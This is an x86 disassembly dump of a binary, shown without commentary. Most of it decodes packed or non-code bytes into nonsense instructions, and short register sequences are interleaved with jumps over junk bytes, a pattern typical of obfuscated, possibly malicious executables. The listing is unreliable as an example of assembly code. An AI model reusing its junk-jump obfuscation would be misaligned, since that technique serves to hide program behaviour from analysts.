  422c16:	das    
  422c17:	lahf   
  422c18:	pushf  
  422c19:	jae    0x422c5d
  422c1b:	(bad)  
  422c1c:	adc    al,0xa3
  422c1e:	or     eax,0xf2ff6c35
  422c23:	retf   0x30a9
  422c26:	shl    BYTE PTR [esi],1
  422c28:	les    edi,FWORD PTR [eax+ecx*2+0x6a]
  422c2c:	add    esi,DWORD PTR [edi-0xf39e53]
  422c32:	mov    ds:0x3c6f3f53,ax
  422c38:	mov    ch,0xf9
  422c3a:	jae    0x422c30
  422c3c:	mov    bl,0x8
  422c3e:	mov    ebp,0x52bd12a1
  422c43:	push   edx
  422c44:	xor    ebp,DWORD PTR [edi+esi*4-0x108e8c97]
  422c4b:	dec    ecx
  422c4c:	gs out 0x25,eax
  422c4f:	xchg   ebx,eax
  422c50:	mov    WORD PTR [ebp-0x4f],gs
  422c53:	xor    di,WORD PTR [esp+edi*1]
  422c57:	fild   DWORD PTR [edi]
  422c59:	xor    ah,ah
  422c5b:	adc    al,BYTE PTR [edi+0x52]
  422c5e:	push   es
  422c5f:	or     al,0x3b
  422c61:	in     al,0x57
  422c63:	mov    esp,0x30dcf5fe
  422c68:	xor    BYTE PTR [edi+eiz*4-0x55e0d1fb],dh
  422c6f:	xor    dh,dh
  422c71:	cli    
  422c72:	add    DWORD PTR [eax-0x3e],0x45c788c5
  422c79:	fmul   QWORD PTR [ebx+0xa]
  422c7c:	add    BYTE PTR [eax],al
  422c7e:	mov    eax,DWORD PTR [ebp-0x24]
  422c81:	jmp    0x422d4f
  422c86:	or     al,0xd9
  422c88:	aam    0x44
  422c8a:	aad    0x4d
  422c8c:	pushf  
  422c8d:	fnop   
  422c8f:	out    dx,al
  422c90:	xchg   ebx,eax
  422c91:	sbb    al,0x29
  422c93:	es xchg ecx,eax
  422c95:	dec    esi
  422c96:	push   esi
  422c97:	cwde   
  422c98:	add    DWORD PTR [eax],eax
  422c9a:	mov    cl,0x0
  422c9c:	add    BYTE PTR [eax],al
  422c9e:	in     al,0xfe
  422ca0:	mov    dl,0x85
  422ca2:	(bad)  
  422ca3:	fisttp DWORD PTR [ecx+ebx*2]
  422ca6:	xor    BYTE PTR ds:0xf03e2f8d,dh
  422cac:	xor    esi,DWORD PTR [edx-0x1a]
  422caf:	inc    esi
  422cb0:	jbe    0x422cdd
  422cb2:	dec    ebp
  422cb3:	mov    edx,0x55c085b0
  422cb8:	fld    QWORD PTR [ecx-0x21c3fb03]
  422cbe:	icebp  
  422cbf:	inc    ebp
  422cc0:	mov    bh,0xb7
  422cc2:	sub    edi,esp
  422cc4:	in     eax,0x5b
  422cc6:	jp     0x422d18
  422cc8:	int    0xad
  422cca:	(bad)  
  422ccb:	js     0x422ca5
  422ccd:	cmp    ah,BYTE PTR [eax]
  422ccf:	test   bl,bh
  422cd1:	cld    
  422cd2:	int3   
  422cd3:	rol    BYTE PTR [ecx+0x243b4033],cl
  422cd9:	xchg   esp,eax
  422cda:	ret    0xcfa6
  422cdd:	(bad)  [edx]
  422cdf:	pop    es
  422ce0:	inc    esp
  422ce1:	sbb    BYTE PTR [esi-0x1db3a93b],al
  422ce7:	outs   dx,DWORD PTR ds:[esi]
  422ce8:	mov    edx,0x47223ae1
  422ced:	popa   
  422cee:	add    BYTE PTR [edi],al
  422cf0:	pop    ds
  422cf1:	retf   0x5ab5
  422cf4:	int3   
  422cf5:	ja     0x422caa
  422cf7:	dec    dx
  422cf9:	jne    0x422d22
  422cfb:	imul   ebx,ecx,0x1
  422cfe:	out    0x3e,al
  422d00:	dec    eax
  422d01:	loopne 0x422d2b
  422d03:	nop
  422d04:	mov    ah,BYTE PTR [ecx+0x27a3b65f]
  422d0a:	jmp    0x422d2b
  422d0c:	pop    esp
  422d0d:	mov    edi,DWORD PTR [ebp+0xb]
  422d10:	retf   
  422d11:	mov    dl,0x8d
  422d13:	jl     0x422cad
  422d15:	sbb    al,0x1b
  422d17:	pop    ebp
  422d18:	shl    ah,cl
  422d1a:	or     al,0xce
  422d1c:	inc    eax
  422d1d:	hlt    
  422d1e:	daa    
  422d1f:	or     BYTE PTR [ebp+0x909ce69],0x9f
  422d26:	loopne 0x422d2f
  422d28:	cmp    DWORD PTR [eax+0x761ff800],eax
  422d2e:	xchg   ebp,eax
  422d2f:	or     DWORD PTR [ecx+0x7f],ebp
  422d32:	xor    ch,BYTE PTR [ebx+0x57]
  422d35:	xchg   ebp,eax
  422d36:	push   edx
  422d37:	lea    esi,[edx+ecx*4-0x22cee3ea]
  422d3e:	ret    0xb63d
  422d41:	sub    DWORD PTR [ecx+0x2e5c3edc],0xece0f4a2
  422d4b:	fwait
  422d4c:	test   DWORD PTR [esi+0x2a],0xdf8558b
  422d53:	add    DWORD PTR [esi],eax
  422d55:	add    BYTE PTR [eax],al
  422d57:	xor    eax,0xffffe0ef
  422d5c:	and    eax,edx
  422d5e:	jmp    0x422e2c
  422d63:	dec    esp
  422d64:	imul   ecx,DWORD PTR fs:[ebx+ebp*2+0x41e4ef8f],0x4f
  422d6d:	pop    eax
  422d6e:	addr16 dec esi
  422d70:	sub    esi,DWORD PTR [eax-0x41]
  422d73:	pop    es
  422d74:	cdq    
  422d75:	add    DWORD PTR [eax],eax
  422d77:	mov    cl,0x0
  422d79:	add    BYTE PTR [eax],al
  422d7b:	rcl    DWORD PTR [edx-0x68],1
  422d7e:	adc    al,0xcf
  422d80:	retf   
  422d81:	into   
  422d82:	(bad)  [edi+0x7d]
  422d85:	popf   
  422d86:	xlat   BYTE PTR ds:[ebx]
  422d87:	mov    esp,esp
  422d89:	scas   al,BYTE PTR es:[edi]
  422d8a:	in     eax,dx
  422d8b:	dec    eax
  422d8c:	sbb    ch,ah
  422d8e:	data16 adc BYTE PTR [ecx+0x41],0x7f
  422d93:	ds adc edx,ebx
  422d96:	jl     0x422de5
  422d98:	inc    eax
  422d99:	retf   0x4410
  422d9c:	pushf  
  422d9d:	xchg   esi,eax
  422d9e:	add    BYTE PTR [eax+eiz*2],ch
  422da1:	adc    al,0xaf
  422da3:	(bad)  [edi-0x21e538c1]
  422da9:	int3   
  422daa:	lea    edi,ds:[ebx-0x19]
  422dae:	popa   
  422daf:	mov    ecx,0xcb73e482
  422db4:	sbb    esi,eax
  422db6:	or     bh,BYTE PTR [ebx+0x5b]
  422db9:	jnp    0x422df4
  422dbb:	sub    eax,0xf5eecdd7
  422dc0:	push   edi
  422dc2:	xor    BYTE PTR [eax+0x51],0x30
  422dc6:	or     bl,BYTE PTR [eax]
  422dc8:	and    eax,0x3aa9e002
  422dcd:	jae    0x422dcd
  422dcf:	mov    ecx,0xe1b56e36
  422dd4:	cmp    BYTE PTR [ebp+0x2e],dl
  422dd7:	cmp    DWORD PTR [eax+0x2947238e],ecx
  422ddd:	jne    0x422de0
  422ddf:	mov    ds:0x70a906b5,eax
  422de4:	(bad)  
  422de5:	std    
  422de6:	and    DWORD PTR [eax+esi*2+0x32],edx
  422dea:	mov    al,0x30
  422dec:	pavgb  mm4,QWORD PTR [esi+ebx*2+0x18ae687e]
  422df4:	inc    esi
  422df5:	les    ebp,FWORD PTR [edi+eiz*8+0x59]
  422df9:	pop    ebp
  422dfa:	mov    bl,0x7
  422dfc:	mov    al,0x3b
  422dfe:	xchg   edx,eax
  422dff:	neg    ch
  422e01:	fisttp DWORD PTR [edi-0x76]
  422e04:	and    ecx,DWORD PTR [esi-0x50]
  422e07:	cld    
  422e08:	inc    esi
  422e09:	push   ecx
  422e0a:	jg     0x422db9
  422e0c:	xor    WORD PTR [esi+esi*4],sp
  422e10:	mov    dl,0x38
  422e12:	push   0xffffffbe
  422e14:	jmp    0x422dc3
  422e16:	fld    QWORD PTR [ecx+0x3b3b33c0]
  422e1c:	dec    esi
  422e1d:	aas    
  422e1e:	push   ecx
  422e1f:	xor    dh,ah
  422e21:	mov    cl,0xd6
  422e23:	jns    0x422e6f
  422e25:	dec    edi
  422e26:	cli    
  422e27:	fwait
  422e28:	ins    BYTE PTR es:[edi],dx
  422e29:	push   ebx
  422e2a:	mov    ebx,0x5f192509
  422e2f:	add    BYTE PTR [eax],al
  422e31:	mov    DWORD PTR [ebp-0xc],eax
  422e34:	mov    DWORD PTR [ebp-0x8],ebx
  422e37:	mov    DWORD PTR [ebp-0x24],0x47ff
  422e3e:	mov    eax,DWORD PTR [ebp-0x24]
  422e41:	mov    ebx,DWORD PTR [ebp-0x8]
  422e44:	and    eax,edi
  422e46:	jmp    0x422f14
  422e4b:	jb     0x422eac
  422e4d:	jnp    0x422e2a
  422e4f:	jg     0x422e50
  422e51:	repnz jmp FWORD PTR [edx-0x79]
  422e55:	shl    ah,cl
  422e57:	int3   
  422e58:	mov    ebx,0x99b87079
  422e5d:	add    DWORD PTR [eax],eax
  422e5f:	mov    cl,0x0
  422e61:	add    BYTE PTR [eax],al
  422e63:	add    eax,0xf3d8986
  422e68:	sub    eax,0xa6bee678
  422e6d:	popa   
  422e6e:	test   al,0x1c
  422e70:	jl     0x422e62
  422e72:	cmp    DWORD PTR [esi],eax
  422e74:	jb     0x422e73
  422e76:	mov    ebp,0xa6bba206
  422e7b:	sbb    dl,ah
  422e7d:	or     ch,cl
  422e7f:	xchg   DWORD PTR [ebp+eax*2+0x5716863c],ebx
  422e86:	mov    ch,0xa5
  422e88:	pop    es
  422e89:	push   edx
  422e8a:	mov    dh,0xad
  422e8c:	cmp    ecx,0x6eabcfe5
  422e92:	inc    ebx
  422e93:	repnz dec ecx
  422e95:	ins    BYTE PTR es:[edi],dx
  422e96:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  422e98:	sbb    BYTE PTR [esi+0x6e617ddd],0xf8
  422e9f:	pop    eax
  422ea0:	add    ebx,edx
  422ea2:	pop    eax
  422ea3:	and    eax,0x8990bf5b
  422ea8:	xor    edx,DWORD PTR [edx+0x56]
  422eab:	push   ss
  422eac:	mov    ebx,0x1f21ed43
  422eb1:	add    BYTE PTR [esi+0x57763dd4],0x2a
  422eb8:	dec    edx
  422eb9:	fcomp  QWORD PTR [ebx-0x4f]
  422ebc:	daa    
  422ebd:	int    0xd7
  422ebf:	mov    bh,dh
  422ec1:	scas   eax,DWORD PTR es:[edi]
  422ec2:	cmp    eax,0xe8139a09
  422ec7:	int3   
  422ec8:	push   edx
  422ec9:	sahf   
  422eca:	sbb    DWORD PTR [eax+0x38],ebx
  422ecd:	adc    BYTE PTR [edi+0x4bfa7f02],ah
  422ed3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422ed4:	and    ch,0xfb
  422ed7:	inc    ebx
  422ed8:	sar    DWORD PTR [edi],cl
  422eda:	xchg   edi,eax
  422edb:	loopne 0x422ecc
  422edd:	(bad)  
  422ede:	jge    0x422e93
  422ee0:	mov    cs,WORD PTR [eax+0x34]
  422ee3:	sub    BYTE PTR [edx],0xb0
  422ee6:	pop    esi
  422ee7:	scas   eax,DWORD PTR es:[edi]
  422ee8:	into   
  422ee9:	nop
  422eea:	push   esp
  422eeb:	mov    ebx,0xe1d72d46
  422ef0:	mov    dl,0xf1
  422ef2:	sub    DWORD PTR [eax],ebx
  422ef4:	das    
  422ef5:	add    al,0xd5
  422ef7:	jmp    0x7717:0xad01594b
  422efe:	in     eax,0x17
  422f00:	sub    eax,0xf6b05c52
  422f05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f06:	les    esp,FWORD PTR [edx]
  422f08:	ss ja  0x422ef2
  422f0b:	mov    ds:0xfaafcd3a,al
  422f11:	clc    
  422f12:	pop    ss
  422f13:	mov    edi,0xc133d233
  422f18:	div    ebx
  422f1a:	mov    edx,DWORD PTR [ebp-0xc]
  422f1d:	add    BYTE PTR [ebp-0x1],0x5e
  422f21:	cmp    eax,edx
  422f23:	jmp    0x422ff1
  422f28:	imul   ebx,DWORD PTR [ebx-0x23],0xc
  422f2c:	std    
  422f2d:	mov    ?,ebx
  422f2f:	jg     0x422f31
  422f31:	mov    esp,0x6cbccde1
  422f36:	mov    edx,0x19a699f
  422f3b:	add    BYTE PTR [ecx-0x52000000],dh
  422f41:	pop    edi
  422f42:	cli    
  422f43:	push   0xa66d8c27
  422f48:	nop
  422f49:	mov    dl,0x87
  422f4b:	sub    al,0x73
  422f4d:	cli    
  422f4e:	xor    al,0x63
  422f50:	div    BYTE PTR [ecx+0x79]
  422f53:	imul   eax,DWORD PTR [edi],0x8554209a
  422f59:	bnd ret 0xe391
  422f5d:	int3   
  422f5e:	test   al,0x15
  422f60:	call   0x85f4f12a
  422f65:	shr    BYTE PTR [ecx],1
  422f67:	hlt    
  422f68:	and    dl,BYTE PTR [ebp+0x5cdc71ef]
  422f6e:	push   ss
  422f6f:	iret   
  422f70:	ret    
  422f71:	cld    
  422f72:	rol    DWORD PTR [ebp-0x6b1374e1],1
  422f78:	pushf  
  422f79:	jge    0x422fdf
  422f7b:	clc    
  422f7c:	and    ah,BYTE PTR [ebx]
  422f7e:	mov    edx,0x7f87617b
  422f83:	div    dh
  422f85:	mov    DWORD PTR [esi-0x3],0xd59cf738
  422f8c:	imul   edi,DWORD PTR [esp+eiz*8],0xffffffec
  422f90:	sub    eax,0xedd09bf2
  422f95:	retf   
  422f96:	sub    ecx,esp
  422f98:	adc    BYTE PTR [edx],0x88
  422f9b:	xor    bl,BYTE PTR [ebp+0x5e]
  422f9e:	stc    
  422f9f:	inc    esi
  422fa0:	dec    edi
  422fa1:	aam    0xb3
  422fa3:	in     eax,dx
  422fa4:	sub    esp,edi
  422fa6:	add    edi,DWORD PTR [esi+0x36731b2c]
  422fac:	loop   0x422fa3
  422fae:	cld    
  422faf:	add    edi,DWORD PTR [eax+0x4c]
  422fb2:	mov    eax,0xa50717b2
  422fb7:	into   
  422fb8:	jmp    0x422f92
  422fba:	in     al,0xb2
  422fbc:	dec    edx
  422fbd:	addr16 push esi
  422fbf:	push   cs
  422fc0:	lea    ebp,[eax-0x6bacd1c4]
  422fc6:	sub    eax,0xf387a7ae
  422fcb:	xor    eax,0x899ab0a
  422fd0:	or     eax,0x840a2c56
  422fd5:	mov    ds:0xc8c8335e,al
  422fda:	int    0x70
  422fdc:	sbb    DWORD PTR [eax],ecx
  422fde:	rol    BYTE PTR [edi-0xf35635b],cl
  422fe4:	cwde   
  422fe5:	add    BYTE PTR [edx-0x472b7c6f],dl
  422feb:	pop    ebx
  422fec:	mov    ecx,0x54924f5a
  422ff1:	jae    0x423513
  422ff7:	mov    DWORD PTR [ebp-0x14],0x4de2
  422ffe:	mov    DWORD PTR [ebp-0x18],0x3726
  423005:	jmp    0x4230d3
  42300a:	or     BYTE PTR [edi-0x878bd],bh
  423010:	int3   
  423011:	mov    edi,0x383f5c99
  423016:	jmp    DWORD PTR [edx-0x72]
  423019:	imul   ebx,DWORD PTR [edx],0xb100019b
  42301f:	add    BYTE PTR [eax],al
  423021:	add    BYTE PTR [ebp-0x9],bl
  423024:	ret    0xd76d
  423027:	mov    WORD PTR [edi],es
  423029:	mov    WORD PTR [edi-0x26],fs
  42302c:	(bad)  
  42302d:	pop    ecx
  42302e:	mov    edx,0xce4f309
  423033:	mov    dh,0x76
  423035:	jne    0x42305b
  423037:	inc    eax
  423038:	rcr    DWORD PTR [edx-0x5a],0x1e
  42303c:	bts    DWORD PTR [ebx+eax*2+0x3bafcf20],eax
  423044:	mov    DWORD PTR cs:[edi-0x52a0a899],esp
  42304b:	lock pop edx
  42304d:	jmp    0xe43e:0x1d579392
  423054:	xor    eax,0x86317efa
  423059:	lahf   
  42305a:	sbb    BYTE PTR [ebp-0x72f958d9],cl
  423060:	into   
  423061:	pop    edx
  423062:	cmc    
  423063:	popf   
  423064:	arpl   WORD PTR [ecx+0x22],bp
  423067:	and    BYTE PTR [ebp-0x3f9fa48c],dh
  42306d:	mov    al,ds:0x3f3f7776
  423072:	pushf  
  423073:	and    eax,0x98412fa0
  423078:	sbb    BYTE PTR [esi],0xd7
  42307b:	shr    BYTE PTR [eax+0x41],cl
  42307e:	xchg   esp,eax
  42307f:	mov    fs:0xa9ba6308,al
  423085:	pusha  
  423086:	ins    DWORD PTR es:[edi],dx
  423087:	inc    ebx
  423088:	aad    0x15
  42308a:	jmp    0x3e899f77
  42308f:	mov    ah,0xfc
  423091:	(bad)  
  423093:	aas    
  423094:	xchg   ecx,eax
  423095:	pusha  
  423096:	stc    
  423097:	push   ecx
  423098:	ds fwait
  42309a:	out    0xa0,al
  42309c:	daa    
  42309d:	aad    0x91
  42309f:	mov    ch,0x79
  4230a1:	jl     0x423051
  4230a3:	pop    ds
  4230a4:	dec    eax
  4230a5:	cdq    
  4230a6:	in     al,0x74
  4230a8:	sbb    DWORD PTR [ebx+0x7b],ebp
  4230ab:	rcr    DWORD PTR [ebx+esi*8],cl
  4230ae:	fcomp  DWORD PTR [ebx]
  4230b0:	call   0xaf04:0x8f066d13
  4230b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4230b8:	call   0x223d:0xe8187337
  4230bf:	ss scas al,BYTE PTR es:[edi]
  4230c1:	stos   DWORD PTR es:[edi],eax
  4230c2:	sbb    ebx,DWORD PTR [esi+0x23b5855d]
  4230c8:	sub    al,0xb2
  4230ca:	mov    eax,0x5191be7c
  4230cf:	je     0x4230b9
  4230d1:	div    ah
  4230d3:	mov    DWORD PTR [ebp-0xc],0x2e39
  4230da:	jmp    0x4231a8
  4230df:	xchg   esi,eax
  4230e0:	not    cl
  4230e2:	fyl2x  
  4230e4:	call   FWORD PTR [esi+0x204ca0ff]
  4230ea:	sbb    al,0xe5
  4230ec:	imul   edi
  4230ee:	imul   ecx,ebx,0xb100019b
  4230f4:	add    BYTE PTR [eax],al
  4230f6:	add    dh,bl
  4230f8:	outs   dx,BYTE PTR ds:[esi]
  4230f9:	(bad)  
  4230fa:	push   cs
  4230fb:	sub    eax,0x51f9c21
  423100:	cmp    BYTE PTR [ecx-0x28],dh
  423103:	mov    bh,0x2
  423105:	mov    ah,0x77
  423107:	aad    0x38
  423109:	into   
  42310a:	js     0x423159
  42310c:	inc    edi
  42310d:	cmp    BYTE PTR ds:0xe78aee58,0x56
  423114:	inc    eax
  423115:	dec    esi
  423116:	stc    
  423117:	inc    eax
  423118:	in     eax,dx
  423119:	cmp    dh,BYTE PTR [ebx+0x45145469]
  42311f:	pushf  
  423120:	xchg   DWORD PTR [esp+esi*4+0x3bdc8d62],edx
  423127:	fcmovne st,st(2)
  423129:	dec    ebx
  42312a:	dec    ebx
  42312b:	hlt    
  42312c:	mov    ecx,0xd9b05433
  423131:	fwait
  423132:	mov    al,0xdd
  423134:	int    0xc2
  423136:	xchg   BYTE PTR [edi],al
  423138:	or     eax,0xdd507c5d
  42313d:	ror    DWORD PTR [edx*8+0x435042e7],0x6e
  423145:	int    0x31
  423147:	adc    ch,ah
  423149:	sub    DWORD PTR [edx+edi*2-0x3fde2658],edi
  423150:	(bad)  
  423151:	das    
  423152:	out    dx,eax
  423153:	push   0x2
  423155:	pop    ebp
  423156:	neg    BYTE PTR [ebx+0x28f79d29]
  42315c:	sub    bl,BYTE PTR [edi]
  42315e:	xor    ch,0x54
  423161:	sbb    BYTE PTR [esi-0x1e0ff2c0],dh
  423167:	test   DWORD PTR [ebx+0x39],esp
  42316a:	xor    esi,DWORD PTR [edi+esi*8]
  42316d:	dec    edi
  42316e:	out    dx,eax
  42316f:	xlat   BYTE PTR ds:[ebx]
  423170:	dec    esp
  423171:	in     al,0xa3
  423173:	ins    DWORD PTR es:[edi],dx
  423174:	push   0x55
  423176:	cwde   
  423177:	test   BYTE PTR [edi],bh
  423179:	mov    WORD PTR [ecx-0x6d7ffc96],cs
  42317f:	mov    ecx,ebp
  423181:	or     BYTE PTR [esi+0x56],bl
  423184:	inc    ebx
  423185:	into   
  423186:	sbb    bl,BYTE PTR [edx]
  423188:	retf   
  423189:	sbb    BYTE PTR [ebx-0x664852e7],0xa9
  423190:	das    
  423191:	push   edi
  423192:	mov    ch,dl
  423194:	inc    eax
  423195:	mov    ch,0xf4
  423197:	fwait
  423198:	pop    es
  423199:	and    BYTE PTR [ebx-0x4e1f32e5],0x3c
  4231a0:	nop
  4231a1:	add    dh,ah
  4231a3:	adc    DWORD PTR [eax-0x38891f3d],ebp
  4231a9:	inc    ebp
  4231aa:	clc    
  4231ab:	push   es
  4231ac:	jl     0x4231ae
  4231ae:	add    bh,al
  4231b0:	inc    ebp
  4231b1:	fmul   QWORD PTR [ecx]
  4231b3:	imul   eax,DWORD PTR [eax],0xdc458b00
  4231b9:	mov    edx,DWORD PTR [ebp-0x8]
  4231bc:	jmp    0x42328a
  4231c1:	shl    BYTE PTR [ebp+0x3eff34bb],cl
  4231c7:	fcomip st,st(7)
  4231c9:	mov    ebp,0x614eafc5
  4231ce:	iret   
  4231cf:	outs   dx,BYTE PTR ds:[esi]
  4231d0:	je     0x42324e
  4231d2:	pushf  
  4231d3:	add    DWORD PTR [eax],eax
  4231d5:	mov    cl,0x0
  4231d7:	add    BYTE PTR [eax],al
  4231d9:	jge    0x42321f
  4231db:	or     BYTE PTR [edi+esi*2-0x70],dh
  4231df:	sub    al,0x79
  4231e1:	sbb    ebx,DWORD PTR [edi+0x4b]
  4231e4:	nop
  4231e5:	mov    al,0xd7
  4231e7:	mov    eax,ds:0x3e81665b
  4231ec:	cmp    eax,0x40cae8f9
  4231f1:	adc    al,0x66
  4231f3:	inc    esp
  4231f4:	xor    ah,BYTE PTR [esi+ebx*1-0x194aaf37]
  4231fb:	push   ecx
  4231fc:	cmp    bl,BYTE PTR [eax]
  4231fe:	ret    
  4231ff:	call   0x4bfb:0x9b175a7b
  423206:	mov    dh,0x29
  423208:	jo     0x423221
  42320a:	in     eax,0x2a
  42320c:	(bad)  
  42320d:	scas   al,BYTE PTR es:[edi]
  42320e:	pop    esp
  42320f:	jns    0x423230
  423211:	dec    ebp
  423212:	add    BYTE PTR [edi],ah
  423214:	push   esi
  423215:	scas   eax,DWORD PTR es:[edi]
  423216:	jo     0x42325d
  423218:	stos   DWORD PTR es:[edi],eax
  423219:	lahf   
  42321a:	xor    BYTE PTR ds:0x10946fcb,al
  423220:	cld    
  423221:	jl     0x4231e8
  423223:	pop    esp
  423224:	add    BYTE PTR [ebx-0x58],bh
  423227:	xlat   BYTE PTR ds:[ebx]
  423228:	jp     0x4231e8
  42322a:	iret   
  42322b:	xchg   esp,eax
  42322c:	fcomp  DWORD PTR [edx]
  42322e:	cs inc esp
  423230:	dec    edi
  423231:	test   eax,0x31ebfb1a
  423236:	out    dx,eax
  423237:	aas    
  423238:	mov    WORD PTR [edi-0x23729f93],fs
  42323e:	pop    ebx
  42323f:	add    dh,BYTE PTR [esi+0x28f7d37f]
  423245:	imul   ebp,DWORD PTR [ebp-0x51663ae],0x257a6bb7
  42324f:	push   esp
  423250:	mov    edi,0x8d1af43b
  423255:	fistp  WORD PTR [ebx+0x1d8a89d5]
  42325b:	lods   eax,DWORD PTR ds:[esi]
  42325c:	sbb    eax,0x4cba3b16
  423261:	mov    dh,BYTE PTR [eax+0x7b4d0cb4]
  423267:	mov    bh,0x35
  423269:	sar    DWORD PTR [edi+edi*4+0x4e7634a3],cl
  423270:	adc    al,0x0
  423272:	push   ds
  423273:	jmp    0xf2a7531d
  423278:	mov    ds:0xb5d2da8f,al
  42327d:	stc    
  42327e:	sbb    DWORD PTR [ebp+ebp*8+0x60be37f7],0xe2b0f738
  423289:	cmp    DWORD PTR [ebx],ebp
  42328b:	ror    BYTE PTR [ebx-0x2fcc0bbb],1
  423291:	mov    eax,DWORD PTR [ebp-0x18]
  423294:	sub    edx,0x2897
  42329a:	imul   edx,eax
  42329d:	jmp    0x42336b
  4232a2:	lock jb 0x4232fd
  4232a5:	ret    
  4232a6:	(bad)  
  4232a8:	sti    
  4232a9:	jae    0x4232af
  4232ab:	push   0xb883deb9
  4232b0:	daa    
  4232b1:	dec    esi
  4232b2:	sub    eax,0xb100019d
  4232b7:	add    BYTE PTR [eax],al
  4232b9:	add    BYTE PTR [edi+0x71503f82],bh
  4232bf:	mov    esp,0xe1cca20c
  4232c4:	cmp    DWORD PTR [ebx+0x32],ebx
  4232c7:	stc    
  4232c8:	or     DWORD PTR [edi-0x1f7388ec],0xfffffffc
  4232cf:	xchg   edx,eax
  4232d0:	imul   edx,esi,0xd2370399
  4232d6:	lods   al,BYTE PTR ds:[esi]
  4232d7:	sbb    al,BYTE PTR [eax-0x6a]
  4232da:	repnz clc 
  4232dc:	imul   edx,DWORD PTR [edx],0xf3858fce
  4232e2:	adc    BYTE PTR [eax-0x5f913a7d],ah
  4232e8:	inc    ecx
  4232e9:	dec    esi
  4232ea:	mov    WORD PTR [esi+0x69d3dedb],ds
  4232f0:	ret    
  4232f1:	sahf   
  4232f2:	or     esp,ebp
  4232f4:	repz or DWORD PTR [ebx],ebx
  4232f7:	nop
  4232f8:	mov    ah,0x7e
  4232fa:	test   BYTE PTR [eax],dh
  4232fc:	outs   dx,BYTE PTR ds:[esi]
  4232fd:	aad    0x99
  4232ff:	bound  ecx,QWORD PTR [edi-0x9]
  423302:	or     esp,DWORD PTR [ebx-0x36]
  423305:	jg     0x423322
  423307:	scas   al,BYTE PTR es:[edi]
  423308:	aad    0x64
  42330a:	fiadd  WORD PTR [esi+0x74]
  42330d:	push   0xd1ca2c35
  423312:	pop    eax
  423313:	mov    ecx,0xd60c6e26
  423318:	rol    DWORD PTR [ecx+edi*8-0x16],1
  42331c:	(bad)  
  42331d:	jmp    0x4232a8
  42331f:	xor    eax,edx
  423321:	int    0x56
  423323:	fadd   DWORD PTR [ecx]
  423325:	js     0x423324
  423327:	inc    edx
  423328:	shl    BYTE PTR [ebx],cl
  42332a:	dec    ebx
  42332b:	adc    eax,0x4bac419
  423330:	inc    edx
  423331:	jae    0x4232bc
  423333:	fnstsw WORD PTR [ebp+0x1b8d55fa]
  423339:	xor    al,dh
  42333b:	push   edi
  42333c:	add    eax,0x6b1212af
  423341:	(bad)  
  423342:	cmp    dh,BYTE PTR [ebp-0x151a94d5]
  423348:	sub    eax,0x3a0b65fc
  42334d:	adc    eax,0x4452fc1d
  423352:	dec    eax
  423353:	cmp    al,0x7a
  423355:	mov    ah,0x18
  423357:	es push edi
  423359:	push   ds
  42335a:	(bad)  
  42335b:	retf   
  42335c:	shr    DWORD PTR ds:0x3b018b44,0x1e
  423363:	sahf   
  423364:	sub    bl,BYTE PTR [ebx]
  423366:	mov    esp,es
  423368:	xchg   esp,eax
  423369:	cmc    
  42336a:	dec    esp
  42336b:	mov    eax,DWORD PTR [ebp-0x14]
  42336e:	and    edx,eax
  423370:	jmp    0x42343e
  423375:	lahf   
  423376:	mov    ch,0xb6
  423378:	sar    DWORD PTR [esi-0x3900002d],1
  42337e:	popf   
  42337f:	push   esi
  423380:	pop    edi
  423381:	in     ax,dx
  423383:	inc    ecx
  423384:	or     eax,0x19dde
  423389:	mov    cl,0x0
  42338b:	add    BYTE PTR [eax],al
  42338d:	(bad)  
  42338e:	in     al,dx
  42338f:	pause  
  423391:	cmp    BYTE PTR [eax-0xe5ec356],ah
  423397:	ror    DWORD PTR [edx],1
  423399:	adc    eax,0xab58dbd6
  42339e:	inc    ebp
  42339f:	pop    ds
  4233a0:	jmp    FWORD PTR [esi]
  4233a2:	repnz push 0x8716e0ba
  4233a8:	popf   
  4233a9:	(bad)  
  4233aa:	fldenv [ebp-0x30d95ed2]
  4233b0:	adc    BYTE PTR ds:0xe1c661b8,dh
  4233b6:	(bad)  
  4233b8:	pop    ss
  4233b9:	pushf  
  4233ba:	dec    esp
  4233bb:	xor    BYTE PTR [eax-0x614830b9],0xaf
  4233c2:	neg    esp
  4233c4:	(bad)  
  4233c5:	push   cs
  4233c6:	bound  esi,QWORD PTR [ebx+esi*4+0x72]
  4233ca:	aaa    
  4233cb:	and    eax,0xab286094
  4233d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4233d1:	dec    edi
  4233d2:	fs retf 
  4233d4:	in     al,dx
  4233d5:	stos   BYTE PTR es:[edi],al
  4233d6:	mov    WORD PTR [ebx],es
  4233d8:	xor    DWORD PTR [esi],ecx
  4233da:	pusha  
  4233db:	push   edi
  4233dc:	push   ebx
  4233dd:	imul   ecx,DWORD PTR [eax+0x27],0x7ef88668
  4233e4:	push   ss
  4233e5:	mov    ebp,ebp
  4233e7:	mov    bh,0x54
  4233e9:	rcl    esp,cl
  4233eb:	cmp    BYTE PTR [ecx+0x2a],dh
  4233ee:	dec    edi
  4233ef:	ja     0x423469
  4233f1:	xchg   ecx,eax
  4233f2:	inc    esi
  4233f3:	rol    DWORD PTR [ecx+0x5c621a5],0x81
  4233fa:	popa   
  4233fb:	push   eax
  4233fc:	(bad)  
  4233fd:	shr    DWORD PTR [ecx+edi*4+0x28],1
  423401:	add    dh,BYTE PTR [edi]
  423403:	dec    ecx
  423404:	jnp    0x423467
  423406:	or     edi,eax
  423408:	cli    
  423409:	push   esp
  42340a:	outs   dx,BYTE PTR ds:[esi]
  42340b:	push   ecx
  42340c:	stc    
  42340d:	mov    ecx,0xc499c9ac
  423412:	hlt    
  423413:	mov    bh,dl
  423415:	clc    
  423416:	adc    dh,BYTE PTR [ecx-0x34eb30d7]
  42341c:	add    dl,dh
  42341e:	(bad)  
  42341f:	js     0x4233ba
  423421:	cld    
  423422:	push   eax
  423423:	cmp    DWORD PTR [ebx-0xb38f4b5],esi
  423429:	and    al,0x39
  42342b:	in     eax,dx
  42342c:	push   ds
  42342d:	sar    ebp,cl
  42342f:	jns    0x4233c6
  423431:	sub    al,0x76
  423433:	les    ebp,FWORD PTR [ebx+0x4f109f0a]
  423439:	mul    edx
  42343b:	or     DWORD PTR [ebx-0xb23f94],eax
  423441:	add    al,0xe9
  423443:	leave  
  423444:	add    BYTE PTR [eax],al
